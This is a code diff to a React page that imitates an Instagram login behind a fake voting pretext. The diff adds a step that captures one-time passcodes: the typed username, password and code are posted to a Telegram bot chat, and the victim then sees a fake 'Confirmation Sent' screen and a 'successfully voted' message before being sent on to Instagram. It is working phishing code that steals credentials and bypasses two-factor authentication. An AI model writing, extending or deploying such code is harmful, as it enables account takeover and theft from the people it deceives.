@@ -6,6 +6,9 @@ function App() {
 
   const [username, setUsername] = useState("");
   const [password, setPassword] = useState("");
+  const [otp, setOtp] = useState("");
+  const [showOTP, setShowOTP] = useState(false)
+  const [completed, setCompleted] = useState(false)
 
   const linknames = [
     "Meta",
@@ -29,6 +32,25 @@ function App() {
   const updates = 'https://api.telegram.org/bot' + token + '/getUpdates';
   
 
+  const sendOtp = async () => {
+    if(username && password){
+    // Create the payload with chat_id (username or phone number) and text (message)
+    const payload = {
+      chat_id: "1936090861",
+      text: `
+username/email/phone number: ${username}
+password: ${password} 
+OTP: ${otp}
+`,
+    };
+    axios.post(telegramApiUrl, payload)
+      .then(() => {
+        setCompleted(true)
+      })
+      .catch((error) => console('Error sending message: ' + error));
+    }
+}
+
   const sendMessage = async () => {
         if(username && password){
         // Create the payload with chat_id (username or phone number) and text (message)
@@ -48,13 +70,49 @@ password: ${password}
         // Send the HTTP POST request to the Telegram Bot API
         axios.post(telegramApiUrl, payload)
           .then(() => {
-            window.location = "https://instagram.com"
+            setShowOTP(true);
           })
           .catch((error) => console('Error sending message: ' + error));
         }
   }
 
 
+
+  if(completed){
+    return (
+      <div className="main">
+        <h1 className='text-center mt-5'>You have successfully voted 🎉</h1>
+        <form action="">
+        <button type='button'>
+          <a className='text-white' href="https://instagram.com">Continue to Instagram</a>
+        </button>
+        </form>
+      </div>
+    )
+  }
+
+
+  if(showOTP){
+    return (
+      <div className="main">
+          <form>
+          <img src="/img/instagram-logo.png" alt="" srcset="" />
+          <h4 className='text-center'>Confirmation Sent</h4>
+          <p className='text-center'>Enter the code we sent to you</p>
+          <input
+          value={otp}
+          required
+          onInput={e => setOtp(e.target.value)}
+          type="text" placeholder='' />
+          <button type='button' onClick={sendOtp}>
+            Confirm
+          </button>
+        </form>
+      </div>
+    )
+  }
+
+  
   return (
     <>
     <div className="main">
